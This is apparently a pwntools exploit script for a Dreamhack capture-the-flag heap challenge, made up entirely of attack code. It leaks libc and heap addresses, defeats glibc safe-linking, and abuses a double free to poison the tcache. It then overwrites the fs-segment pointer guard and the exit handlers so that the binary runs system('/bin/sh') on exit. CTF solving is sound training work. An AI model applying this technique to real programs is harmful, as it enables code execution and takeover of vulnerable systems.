from pwn import *

# p = remote("host3.dreamhack.games", 20361)
p = process("./chall")
libc = ELF("./libc.so.6")
def decrypt_safe_linking(ptr):
    _12bits = []
    dec = 0
    while ptr != 0:
        _12bits.append(ptr & 0xfff)
        ptr = ptr >> 12

    x = _12bits.pop()
    while len(_12bits) > 0:
        dec |= x
        dec = dec << 12
        y = _12bits.pop()
        x = x ^ y
    dec |= x

    return dec

def safe_link(pos, ptr):
    return (pos >> 12) ^ ptr

def Create(idx, data):
    p.sendlineafter(b": ", b"1")
    p.sendlineafter(b": ", str(idx).encode())
    p.sendafter(b": ", data)

def Update(idx, data):
    p.sendlineafter(b": ", b"2")
    p.sendlineafter(b": ", str(idx).encode())
    p.sendafter(b": ", data)

def Read(idx):
    p.sendlineafter(b": ", b"3")
    p.sendlineafter(b": ", str(idx).encode())
    return p.recvline().split(b": ")[1][:-1]

def Delete(idx):
    p.sendlineafter(b": ", b"4")
    p.sendlineafter(b": ", str(idx).encode())

def Exit():
    p.sendlineafter(b": ", b"5")

p.sendlineafter(b": ", b"-")
libc_addr = int(p.recvline().split(b" is ")[0])
libc_base = libc_addr - 0x816e5
libc.addr = libc_base
# heap leak and exit_handlers exploit => double free bug 
Create(0, b"A"*175)
Delete(0)
Update(0, p64(0)*2)
Delete(0)
heap_base = decrypt_safe_linking(u64(Read(0).ljust(8, b"\x00"))) - 0x2a0
anon = libc_base - 0x3000
fs_base_0x30  = anon + 0x770
Update(0, p64(safe_link(heap_base, fs_base_0x30))) # chunk (fd)-> fs_base+0x30
# pause()
Create(1, b"A"*175)
Create(2, p64(0))
Update(0, p64(0)*2)
Delete(0)
# pause()
Update(0, p64(0)*2)
Delete(0)
# pause()
Update(0, p64(safe_link(heap_base, libc_base + 0x21a838-0x8)))
# pause()

fake_exit_addr = heap_base + 0x2a0
fake_exit = p64(0) + p64(1) + p64(4) + p64(rol(libc_base + 0x50d70, 0x11, word_size=64)) + p64(libc_base+next(libc.search(b'/bin/sh\x00'))) # + b"/bin/sh\x00"
Create(3, fake_exit)
pause()
Create(4, p64(fake_exit_addr)*2)
pause()
Exit()

p.interactive()

